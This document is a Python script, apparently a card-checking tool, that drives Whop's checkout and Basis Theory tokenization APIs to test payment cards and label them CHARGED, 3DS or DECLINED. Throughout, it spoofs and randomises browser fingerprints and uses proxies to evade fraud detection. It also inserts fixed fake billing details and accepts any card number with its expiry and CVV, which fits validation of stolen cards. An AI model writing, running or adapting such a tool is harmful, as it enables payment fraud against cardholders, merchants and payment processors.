import base64
import hashlib
import threading
import json
import re
import sys
from datetime import datetime, timedelta, timezone
from urllib.parse import urlparse, parse_qs

DEVICE_INFO = {
    "uaBrands": [
        {"brand": "Chromium", "version": "152"},
        {"brand": "Not?A_Brand", "version": "24"},
        {"brand": "Brave", "version": "152"},
    ],
    "uaMobile": False,
    "uaPlatform": "Windows",
    "languages": ["en-US"],
    "timeZone": "Asia/Calcutta",
    "cookiesEnabled": True,
    "localStorageEnabled": True,
    "sessionStorageEnabled": True,
    "platform": "Win32",
    "hardwareConcurrency": 3,
    "deviceMemoryGb": 8,
    "screenWidth": 2560,
    "screenHeight": 1440,
    "screenAvailWidth": 2560,
    "screenAvailHeight": 1440,
    "innerWidth": 850,
    "innerHeight": 1168,
    "devicePixelRatio": 0.6666666865348816,
    "maxTouchPoints": 0,
    "plugins": [
        "Browser PDF and PS plug in",
        "vXTw3j47",
        "PDF Viewer",
        "IjRvAfX",
        "Microsoft Edge PDF Viewer",
        "Chromium PDF Viewer",
        "WebKit built-in PDF",
    ],
    "mimeTypes": ["application/pdf", "text/pdf"],
    "webdriver": False,
    "suspectedHeadless": False,
    "webglVendor": "Google Inc. (Intel)",
    "webglRenderer": "ANGLE (Intel, Intel(R) HD Graphics 530 (0x00001912) Direct3D11 vs_5_0 ps_5_0, D3D11)",
}

BT_DEVICE_INFO = base64.b64encode(json.dumps(DEVICE_INFO).encode()).decode()

VARIABLES = {
    "checkout_id": "",
    "checkout_secret": "",
    "ssk": "",
    "account_id": "",
    "nonce": "",
    "token_id": "",
    "exp_month": "2",
    "exp_year": "2028",
    "cvc": "123",
    "card_number": "",
    "container_hash": "",
    "plan_id": "",
}

REQUESTS = {
    "basis_session": {
        "url": "https://js.basistheory.com/api/sessions",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.8",
            "bt-api-key": "key_prod_us_pub_Ew4Bw1f81FPoqphvpuX1VR",
            "cache-control": "no-cache",
            "content-type": "application/json",
            "origin": "https://js.basistheory.com",
            "pragma": "no-cache",
            "priority": "u=1, i",
            "referer": "https://js.basistheory.com/web-elements/2.12.2/hosted-elements/data-element.html?element_id=2df89ea7-453d-4b4c-ac46-728115868ad4",
            "sec-ch-ua": '"Chromium";v="152", "Not?A_Brand";v="24", "Brave";v="152"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "sec-fetch-storage-access": "none",
            "sec-gpc": "1",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36",
        },
        "body": {"deviceInfo": DEVICE_INFO},
    },
    "basis_token": {
        "url": "https://js.basistheory.com/api/tokens",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.8",
            "bt-api-key": "key_prod_us_pub_Ew4Bw1f81FPoqphvpuX1VR",
            "bt-device-info": BT_DEVICE_INFO,
            "cache-control": "no-cache",
            "content-type": "application/json",
            "origin": "https://js.basistheory.com",
            "pragma": "no-cache",
            "priority": "u=1, i",
            "referer": "https://js.basistheory.com/web-elements/2.12.2/hosted-elements/data-element.html?element_id=2df89ea7-453d-4b4c-ac46-728115868ad4",
            "sec-ch-ua": '"Chromium";v="152", "Not?A_Brand";v="24", "Brave";v="152"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "sec-fetch-storage-access": "none",
            "sec-gpc": "1",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36",
        },
        "body": {
            "type": "card",
            "containers": ["/card-assembly/{container_hash}/"],
            "expires_at": (datetime.now(timezone.utc) + timedelta(hours=1)).strftime("%Y-%m-%dT%H:%M:%S.000Z"),
            "data": {"number": "{card_number}"},
        },
    },
    "basis_patch_token": {
        "url": "https://js.basistheory.com/api/tokens/{token_id}",
        "method": "PATCH",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.8",
            "bt-api-key": "{ssk}",
            "bt-device-info": BT_DEVICE_INFO,
            "cache-control": "no-cache",
            "content-type": "application/merge-patch+json",
            "origin": "https://js.basistheory.com",
            "pragma": "no-cache",
            "priority": "u=1, i",
            "referer": "https://js.basistheory.com/web-elements/2.12.2/hosted-elements/card-expiration-date-element.html?element_id=03fe0d10-c314-4fc7-9598-1e10bf6caaef",
            "sec-ch-ua": '"Chromium";v="152", "Not?A_Brand";v="24", "Brave";v="152"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "sec-fetch-storage-access": "none",
            "sec-gpc": "1",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36",
        },
        "body": {
            "data": {"expiration_month": "{exp_month}", "expiration_year": "{exp_year}"},
        },
    },
    "basis_patch_cvc": {
        "url": "https://js.basistheory.com/api/tokens/{token_id}",
        "method": "PATCH",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.8",
            "bt-api-key": "{ssk}",
            "bt-device-info": BT_DEVICE_INFO,
            "cache-control": "no-cache",
            "content-type": "application/merge-patch+json",
            "origin": "https://js.basistheory.com",
            "pragma": "no-cache",
            "priority": "u=1, i",
            "referer": "https://js.basistheory.com/web-elements/2.12.2/hosted-elements/card-verification-code-element.html?element_id=007ed1ba-b20b-4543-9e6e-250710b9c5a2",
            "sec-ch-ua": '"Chromium";v="152", "Not?A_Brand";v="24", "Brave";v="152"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "sec-fetch-storage-access": "none",
            "sec-gpc": "1",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36",
        },
        "body": {
            "data": {"cvc": "{cvc}"},
        },
    },
    "whop_card_session": {
        "url": "https://whop.com/api/v1/payment_method_types/card/session",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.8",
            "api-version-date": "2026-08-25-2",
            "cache-control": "no-cache",
            "content-type": "application/json",
            "origin": "https://whop.com",
            "pragma": "no-cache",
            "priority": "u=1, i",
            "referer": "https://whop.com/checkout/{plan_id}/?session={checkout_id}",
            "sec-ch-ua": '"Chromium";v="152", "Not?A_Brand";v="24", "Brave";v="152"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "sec-fetch-storage-access": "none",
            "sec-gpc": "1",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36",
            "whop-private-schema": "true",
            "x-fern-language": "JavaScript",
            "x-fern-runtime": "browser",
            "x-fern-runtime-version": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36",
            "x-ssk": "{ssk}",
        },
        "cookies": {
            "NEXT_LOCALE": "en",
            "whop-theme-resolved": "dark",
            "_whop_ssk": "{ssk}",
            "whop_checkout_key_{checkout_id}": "{client_secret}",
        },
        "body": {
            "account_id": "{account_id}",
            "nonce": "{nonce}",
        },
    },
}




UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36"


# libcurl (curl_cffi) keeps a process-global netlink socket that is NOT
# thread-safe. Concurrent curl_cffi use from multiple threads races on it and
# aborts the whole process: "Unexpected error 9 on netlink descriptor" ->
# "Aborted (core dumped)". Serialize every whop check through one lock so only
# a single libcurl session is active at a time.
_CURL_LOCK = threading.Lock()


def _single_curl(fn):
    def wrapper(*a, **kw):
        with _CURL_LOCK:
            return fn(*a, **kw)
    return wrapper


def get_client():
    try:
        from curl_cffi import requests as cffi
        return ("curl_cffi", cffi)
    except ImportError:
        pass
    try:
        import cloudscraper
        return ("cloudscraper", cloudscraper.create_scraper())
    except ImportError:
        pass
    return ("requests", __import__("requests"))


def proxy_to_url(raw):
    raw = (raw or "").strip()
    if not raw:
        return None
    if raw.startswith(("http://", "https://")):
        return raw
    if "@" in raw:
        return "http://" + raw
    parts = raw.split(":")
    if len(parts) == 4:
        if parts[1].isdigit():
            h, p, u, pw = parts
        else:
            u, pw, h, p = parts
        return f"http://{u}:{pw}@{h}:{p}"
    return "http://" + raw


def get_session(proxy=None):
    try:
        from curl_cffi import requests as cffi
        kw = {"impersonate": "chrome"}
        purl = proxy_to_url(proxy)
        if purl:
            kw["proxies"] = {"http": purl, "https": purl}
        return cffi.Session(**kw)
    except ImportError:
        pass
    try:
        import cloudscraper
        return cloudscraper.create_scraper()
    except ImportError:
        pass
    return __import__("requests")


def substitute(value):
    if isinstance(value, dict):
        return {substitute(k): substitute(v) for k, v in value.items()}
    if isinstance(value, list):
        return [substitute(v) for v in value]
    if isinstance(value, str):
        vals = {k: v for k, v in VARIABLES.items() if v}
        try:
            return value.format(**vals)
        except KeyError:
            return value
    return value


def send(name, session=None):
    spec = REQUESTS[name]
    method = spec["method"].upper()
    headers = {k: str(v) for k, v in substitute(spec["headers"]).items()}
    cookies = substitute(spec.get("cookies") or {})
    if cookies:
        headers["cookie"] = "; ".join(f"{k}={v}" for k, v in cookies.items() if v)
    body = substitute(spec.get("body"))
    data = json.dumps(body) if body is not None else None
    url = substitute(spec["url"])

    if session:
        resp = session.request(method, url, headers=headers, data=data, timeout=30)
    else:
        engine, client = get_client()
        if engine == "curl_cffi":
            kwargs = dict(impersonate="chrome", timeout=30)
            resp = client.request(method, url, headers=headers, data=data, **kwargs)
        else:
            resp = client.request(method, url, headers=headers, data=data, timeout=30)

    return resp




def sha256_hex(text):
    return hashlib.sha256(text.encode()).hexdigest()


def parse_checkout_url(url):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    path_parts = [p for p in parsed.path.split("/") if p]
    plan_id = None
    for p in path_parts:
        if p.startswith("plan_"):
            plan_id = p
            break
    session_id = params.get("session", [None])[0]
    return plan_id, session_id



def classify_whop(msg):
    m = (msg or "").lower()
    if any(k in m for k in ["succeed", "paid", "approved", "processing", "requires_capture"]):
        return "CHARGED"
    if any(k in m for k in ["3ds", "3d_secure", "authentication", "requires_action", "requires_payment_method", "sca_required"]):
        return "3DS"
    if any(k in m for k in ["declin", "insufficient", "do_not_honor", "expired", "incorrect", "generic_decline", "card_velocity", "stolen", "lost_card", "pickup", "restricted", "cvc_check", "invalid"]):
        return "DECLINED"
    if m in ("failed", "canceled"):
        return "DECLINED"
    return "ERROR"


@_single_curl
def run_whop_check(checkout_url, card, email="", proxy=None):
    """Full Whop checkout (Basis Theory tokenize -> Whop confirm -> Stripe). Returns a dict."""
    import random
    import time as _time

    screen_w = random.choice([1920, 2560, 1366, 1440, 1280])
    screen_h = int(screen_w * random.choice([0.5625, 0.625, 0.6]))
    inner_h = screen_h - random.randint(50, 150)
    ratio = round(random.uniform(1.0, 3.0), 4)
    DEVICE_INFO.update({
        "screenWidth": screen_w,
        "screenHeight": screen_h,
        "screenAvailWidth": screen_w,
        "screenAvailHeight": screen_h,
        "innerWidth": random.randint(800, 1400),
        "innerHeight": inner_h,
        "devicePixelRatio": ratio,
        "hardwareConcurrency": random.choice([2, 4, 6, 8, 12, 16]),
        "deviceMemoryGb": random.choice([4, 8, 16, 32]),
        "maxTouchPoints": 0,
        "webglRenderer": f"ANGLE (Intel, Intel(R) HD Graphics {random.choice([530, 620, 630])} (0x0000{random.randint(1000, 9999)}) Direct3D11 vs_5_0 ps_5_0, D3D11)",
    })
    globals()["BT_DEVICE_INFO"] = base64.b64encode(json.dumps(DEVICE_INFO).encode()).decode()

    def fail(msg):
        return {"status": "ERROR", "message": msg, "plan_name": "", "amount": "", "currency": "", "email": email}

    parts = [p.strip() for p in card.replace("/", "|").split("|")]
    if len(parts) != 4:
        return fail("Invalid card format")
    cc, mm, yy, cvv = parts
    if len(yy) == 2:
        yy = "20" + yy
    if not (cc.isdigit() and len(cc) >= 13 and mm.isdigit() and len(mm) <= 2 and yy.isdigit() and len(yy) == 4 and cvv.isdigit() and len(cvv) in (3, 4)):
        return fail("Invalid card format")

    if "whop.com" not in checkout_url:
        return fail("Invalid whop link")

    s = get_session(proxy)
    WHOP_BASE = "https://api.whop.com/api/v1"
    whop_headers = {
        "accept": "application/json",
        "content-type": "application/json",
        "Api-Version-Date": "2026-08-25-2",
        "Whop-Private-Schema": "true",
        "X-Fern-Language": "JavaScript",
        "X-Fern-Runtime": "browser",
        "X-Fern-Runtime-Version": UA,
        "user-agent": UA,
        "origin": "https://whop.com",
        "referer": checkout_url,
    }

    def whop_post(path, body, extra_headers=None):
        h = {**whop_headers}
        if extra_headers:
            h.update(extra_headers)
        return s.post(f"{WHOP_BASE}{path}", headers=h, json=body, timeout=60)

    try:
        r = s.get(checkout_url, timeout=30)
    except Exception:
        return fail("Could not load checkout page")

    biz_match = re.search(r"biz_[A-Za-z0-9]+", r.text)
    if biz_match:
        VARIABLES["account_id"] = biz_match.group(0)

    page_email = ""
    email_match = re.search(r'"email"\s*:\s*"([^"]+)"', r.text)
    if email_match:
        page_email = email_match.group(1)

    plan_id, _ = parse_checkout_url(checkout_url)
    if not plan_id:
        return fail("Invalid checkout link")

    VARIABLES["email"] = email if email else page_email
    if not VARIABLES["email"]:
        return fail("Email not found in checkout page")

    r2 = whop_post("/checkout_sessions", {"items": [{"plan": plan_id, "quantity": 1}]})
    if r2.status_code not in (200, 201):
        return fail("Checkout session failed")

    cs = r2.json()
    VARIABLES["checkout_id"] = cs["id"]
    VARIABLES["checkout_secret"] = cs["client_secret"].split("_secret_", 1)[1]
    VARIABLES["account_id"] = cs.get("seller", {}).get("id", VARIABLES["account_id"])
    client_secret_full = cs["client_secret"]
    VARIABLES["exp_month"] = mm
    VARIABLES["exp_year"] = yy
    VARIABLES["cvc"] = cvv
    VARIABLES["card_number"] = cc

    items = cs.get("items") or []
    plan_name = "N/A"
    if items:
        item = items[0] if isinstance(items[0], dict) else {}
        plan_name = item.get("name", "N/A")
    amount = cs.get("quote", {}).get("breakdown", {}).get("total", {}).get("amount", "N/A")
    currency = cs.get("quote", {}).get("currency", "").upper()

    resp = send("basis_session", session=s)
    if resp.status_code not in (200, 201):
        return fail("Bt session failed")
    bd = resp.json()
    VARIABLES["nonce"] = bd["nonce"]
    VARIABLES["ssk"] = bd["session_key"]
    VARIABLES["container_hash"] = sha256_hex(VARIABLES["nonce"])

    token_body = {
        "type": "card",
        "containers": [f"/card-assembly/{VARIABLES['container_hash']}/"],
        "expiresAt": "2026-08-28T16:00:00.000Z",
        "data": {
            "number": cc,
            "expiration_month": int(mm),
            "expiration_year": int(yy),
            "cvc": cvv,
        },
    }
    resp = s.post("https://js.basistheory.com/api/tokens", headers={
        "accept": "*/*",
        "bt-api-key": "key_prod_us_pub_Ew4Bw1f81FPoqphvpuX1VR",
        "bt-device-info": BT_DEVICE_INFO,
        "content-type": "application/json",
        "origin": "https://js.basistheory.com",
        "user-agent": UA,
    }, json=token_body, timeout=30)
    if resp.status_code not in (200, 201):
        return fail("Tokenize failed")
    td = resp.json()
    VARIABLES["token_id"] = td["id"]

    whop_post("/payment_method_types/card/session", {
        "account_id": VARIABLES["account_id"],
        "nonce": VARIABLES["nonce"],
    }, extra_headers={"x-ssk": VARIABLES["ssk"]})

    resp = whop_post("/confirmation_tokens", {
        "account_id": VARIABLES["account_id"],
        "setup_future_usage": "off_session",
        "payment_method": {
            "type": "card",
            "category": "card",
            "card": {"token": VARIABLES["token_id"]},
        },
        "billing_details": {
            "email": VARIABLES["email"],
            "name": "User",
            "address": {
                "country": "US",
                "line1": "New York",
                "city": "NEW YORK",
                "state": "NY",
                "postal_code": "10001",
            },
        },
        "return_url": checkout_url,
        "browser_info": {
            "platform": "Win32",
            "color_depth": 24,
            "screen_height": 1440,
            "screen_width": 2560,
            "javascript_enabled": True,
            "language": "en-US",
            "java_enabled": False,
            "browser_time_difference": -330,
        },
    }, extra_headers={
        "authorization": "Bearer public",
        "x-ssk": VARIABLES["ssk"],
    })
    try:
        ct = resp.json()
    except Exception:
        ct = {}
    confirmation_token = ct.get("id", ct.get("token", ct.get("confirmation_token", "")))

    resp = whop_post(f"/checkout_sessions/{VARIABLES['checkout_id']}/confirm", {
        "client_secret": client_secret_full,
        "confirmation_token": confirmation_token,
        "attestations": {"tos_accepted": True},
    }, extra_headers={"x-ssk": VARIABLES["ssk"]})
    try:
        conf = resp.json()
    except Exception:
        conf = {}

    err = conf.get("last_confirm_error") or {}
    resp_msg = err.get("message", "")

    polled = {}
    if not resp_msg:
        for _ in range(5):
            _time.sleep(3)
            rp = s.get(
                f"https://whop.com/api/v1/checkout_sessions/{VARIABLES['checkout_id']}",
                params={"client_secret": client_secret_full},
                headers={
                    "accept": "*/*",
                    "api-version-date": "2026-08-25-2",
                    "cache-control": "no-cache",
                    "pragma": "no-cache",
                    "user-agent": UA,
                    "origin": "https://whop.com",
                    "referer": checkout_url,
                    "whop-private-schema": "true",
                    "x-fern-language": "JavaScript",
                    "x-fern-runtime": "browser",
                    "x-fern-runtime-version": UA,
                    "x-ssk": VARIABLES["ssk"],
                },
                timeout=30,
            )
            try:
                polled = rp.json()
            except Exception:
                polled = {}
            resp_msg = (polled.get("last_confirm_error") or {}).get("message", "") or polled.get("message", "")
            if resp_msg:
                break
            pay2 = (polled.get("payment") or {}).get("status", "")
            if pay2 in ("succeeded", "failed", "canceled"):
                resp_msg = pay2
                break
        if not resp_msg:
            resp_msg = (polled.get("payment") or {}).get("status", "")

    status = classify_whop(resp_msg)
    return {
        "status": status,
        "message": resp_msg or "No message",
        "plan_name": plan_name,
        "amount": f"{amount} {currency}".strip(),
        "currency": currency,
        "email": VARIABLES["email"],
    }


def main():
    from pystyle import Colors, Colorate, Center
    import re as _re
    import random
    import uuid

    screen_w = random.choice([1920, 2560, 1366, 1440, 1280])
    screen_h = int(screen_w * random.choice([0.5625, 0.625, 0.6]))
    inner_h = screen_h - random.randint(50, 150)
    ratio = round(random.uniform(1.0, 3.0), 4)

    DEVICE_INFO.update({
        "screenWidth": screen_w,
        "screenHeight": screen_h,
        "screenAvailWidth": screen_w,
        "screenAvailHeight": screen_h,
        "innerWidth": random.randint(800, 1400),
        "innerHeight": inner_h,
        "devicePixelRatio": ratio,
        "hardwareConcurrency": random.choice([2, 4, 6, 8, 12, 16]),
        "deviceMemoryGb": random.choice([4, 8, 16, 32]),
        "maxTouchPoints": 0,
        "webglRenderer": f"ANGLE (Intel, Intel(R) HD Graphics {random.choice([530, 620, 630])} (0x0000{random.randint(1000,9999)}) Direct3D11 vs_5_0 ps_5_0, D3D11)",
    })
    globals()["BT_DEVICE_INFO"] = base64.b64encode(json.dumps(DEVICE_INFO).encode()).decode()

    BANNER = (
        "\n"
        "m     m m    m  mmmm  mmmmm\n"
        "#  #  # #    # m\"  \"m #   \"#\n"
        "\" #\"# # #mmmm# #    # #mmm#\"\n"
        " ## ## #    # #    # #     \n"
        " #   #  #    #  #mm#  #     \n"
        "\n"
        "\n"
    )

    GOLD_SHADES = [
        "145;70;0", "165;85;0", "185;100;0", "205;120;0",
        "225;140;0", "240;165;0", "255;190;0", "255;215;0",
    ]
    GRADIENT = GOLD_SHADES + GOLD_SHADES[-2:0:-1]
    base = "Q3JlYXRlZCBieSBAWG9hcmNoIHwgQFNjcmlwdER1bmc="
    TITLE = base64.b64decode(base).decode()

    print()
    print(Colorate.Horizontal(GRADIENT, Center.XCenter(BANNER), 1))
    print(Colorate.Horizontal(GRADIENT, Center.XCenter(TITLE), 1))
    print()

    def gold(text):
        return Colorate.Horizontal(GRADIENT, str(text), 1)

    def gold_input(msg):
        print(gold(msg), end="")
        return input().strip()

    raw_card = gold_input("Enter card: ")
    parts = [p.strip() for p in raw_card.replace("/", "|").split("|")]
    if len(parts) == 4:
        cc, mm, yy, cvv = parts
        if len(yy) == 2:
            yy = "20" + yy
        if not (cc.isdigit() and len(cc) >= 13 and mm.isdigit() and len(mm) <= 2 and yy.isdigit() and len(yy) == 4 and cvv.isdigit() and len(cvv) in (3, 4)):
            print(gold("\nInvalid format!!!\n"))
            sys.exit(1)
    else:
        print(gold("\nInvalid format!!!\n"))
        sys.exit(1)

    email_input = gold_input("Enter email (optional): ")
    checkout_url = gold_input("Enter checkout link: ")

    if "whop.com" not in checkout_url:
        print(gold("Invalid checkout link!!!"))
        sys.exit(1)

    print(gold("Processing..."))

    import time

    s = get_session()
    WHOP_BASE = "https://api.whop.com/api/v1"
    whop_headers = {
        "accept": "application/json",
        "content-type": "application/json",
        "Api-Version-Date": "2026-08-25-2",
        "Whop-Private-Schema": "true",
        "X-Fern-Language": "JavaScript",
        "X-Fern-Runtime": "browser",
        "X-Fern-Runtime-Version": UA,
        "user-agent": UA,
        "origin": "https://whop.com",
        "referer": checkout_url,
    }

    def whop_post(path, body, extra_headers=None):
        h = {**whop_headers}
        if extra_headers:
            h.update(extra_headers)
        return s.post(f"{WHOP_BASE}{path}", headers=h, json=body, timeout=60)

    r = s.get(checkout_url, timeout=30)

    biz_match = _re.search(r"biz_[A-Za-z0-9]+", r.text)
    if biz_match:
        VARIABLES["account_id"] = biz_match.group(0)

    page_email = ""
    email_match = _re.search(r'"email"\s*:\s*"([^"]+)"', r.text)
    if email_match:
        page_email = email_match.group(1)

    plan_id, _ = parse_checkout_url(checkout_url)
    if not plan_id:
        print(gold("Invalid checkout link!!!"))
        sys.exit(1)

    VARIABLES["email"] = email_input if email_input else page_email
    if not VARIABLES["email"]:
        print(gold("Email not found in checkout page!!!"))
        sys.exit(1)

    r2 = whop_post("/checkout_sessions", {"items": [{"plan": plan_id, "quantity": 1}]})
    if r2.status_code not in (200, 201):
        print(gold("Checkout session failed!!!"))
        sys.exit(1)

    cs = r2.json()
    VARIABLES["checkout_id"] = cs["id"]
    VARIABLES["checkout_secret"] = cs["client_secret"].split("_secret_", 1)[1]
    VARIABLES["account_id"] = cs.get("seller", {}).get("id", VARIABLES["account_id"])
    client_secret_full = cs["client_secret"]
    VARIABLES["exp_month"] = mm
    VARIABLES["exp_year"] = yy
    VARIABLES["cvc"] = cvv
    VARIABLES["card_number"] = cc

    items = cs.get("items") or []
    plan_name = "N/A"
    amount = "N/A"
    currency = ""
    if items:
        item = items[0] if isinstance(items[0], dict) else {}
        plan_name = item.get("name", "N/A")
    amount = cs.get("quote", {}).get("breakdown", {}).get("total", {}).get("amount", "N/A")
    currency = cs.get("quote", {}).get("currency", "").upper()

    resp = send("basis_session", session=s)
    if resp.status_code not in (200, 201):
        print(gold("Bt session failed!!!"))
        sys.exit(1)
    bd = resp.json()
    VARIABLES["nonce"] = bd["nonce"]
    VARIABLES["ssk"] = bd["session_key"]
    VARIABLES["container_hash"] = sha256_hex(VARIABLES["nonce"])

    token_body = {
        "type": "card",
        "containers": [f"/card-assembly/{VARIABLES['container_hash']}/"],
        "expiresAt": "2026-08-28T16:00:00.000Z",
        "data": {
            "number": cc,
            "expiration_month": int(mm),
            "expiration_year": int(yy),
            "cvc": cvv,
        },
    }
    resp = s.post("https://js.basistheory.com/api/tokens", headers={
        "accept": "*/*",
        "bt-api-key": "key_prod_us_pub_Ew4Bw1f81FPoqphvpuX1VR",
        "bt-device-info": BT_DEVICE_INFO,
        "content-type": "application/json",
        "origin": "https://js.basistheory.com",
        "user-agent": UA,
    }, json=token_body, timeout=30)
    if resp.status_code not in (200, 201):
        print(gold("Tokenize failed!!!"))
        sys.exit(1)
    td = resp.json()
    VARIABLES["token_id"] = td["id"]

    resp = whop_post("/payment_method_types/card/session", {
        "account_id": VARIABLES["account_id"],
        "nonce": VARIABLES["nonce"],
    }, extra_headers={"x-ssk": VARIABLES["ssk"]})

    resp = whop_post("/confirmation_tokens", {
        "account_id": VARIABLES["account_id"],
        "setup_future_usage": "off_session",
        "payment_method": {
            "type": "card",
            "category": "card",
            "card": {"token": VARIABLES["token_id"]},
        },
        "billing_details": {
            "email": VARIABLES["email"],
            "name": "User",
            "address": {
                "country": "US",
                "line1": "New York",
                "city": "NEW YORK",
                "state": "NY",
                "postal_code": "10001",
            },
        },
        "return_url": checkout_url,
        "browser_info": {
            "platform": "Win32",
            "color_depth": 24,
            "screen_height": 1440,
            "screen_width": 2560,
            "javascript_enabled": True,
            "language": "en-US",
            "java_enabled": False,
            "browser_time_difference": -330,
        },
    }, extra_headers={
        "authorization": "Bearer public",
        "x-ssk": VARIABLES["ssk"],
    })
    try:
        ct = resp.json()
    except Exception:
        ct = {}
    confirmation_token = ct.get("id", ct.get("token", ct.get("confirmation_token", "")))

    resp = whop_post(f"/checkout_sessions/{VARIABLES['checkout_id']}/confirm", {
        "client_secret": client_secret_full,
        "confirmation_token": confirmation_token,
        "attestations": {"tos_accepted": True},
    }, extra_headers={"x-ssk": VARIABLES["ssk"]})
    try:
        conf = resp.json()
    except Exception:
        conf = {}

    pay = conf.get("payment") or {}
    err = conf.get("last_confirm_error") or {}
    resp_msg = err.get("message", "")

    if not resp_msg:
        import time
        for _ in range(5):
            time.sleep(3)
            rp = s.get(
                f"https://whop.com/api/v1/checkout_sessions/{VARIABLES['checkout_id']}",
                params={"client_secret": client_secret_full},
                headers={
                    "accept": "*/*",
                    "api-version-date": "2026-08-25-2",
                    "cache-control": "no-cache",
                    "pragma": "no-cache",
                    "user-agent": UA,
                    "origin": "https://whop.com",
                    "referer": checkout_url,
                    "whop-private-schema": "true",
                    "x-fern-language": "JavaScript",
                    "x-fern-runtime": "browser",
                    "x-fern-runtime-version": UA,
                    "x-ssk": VARIABLES["ssk"],
                },
                timeout=30,
            )
            try:
                polled = rp.json()
            except Exception:
                polled = {}
            resp_msg = (polled.get("last_confirm_error") or {}).get("message", "") or polled.get("message", "")
            if resp_msg:
                break
            pay2 = (polled.get("payment") or {}).get("status", "")
            if pay2 in ("succeeded", "failed", "canceled"):
                resp_msg = pay2
                break
        if not resp_msg:
            pay2 = (polled.get("payment") or {}).get("status", "")
            resp_msg = pay2

    print(gold("Plan id       : ") + plan_id)
    print(gold("Plan          : ") + plan_name)
    print(gold("Amount        : ") + f"{amount} {currency}")
    print(gold("Resp          : ") + (resp_msg or "No message"))


if __name__ == "__main__":
    main()
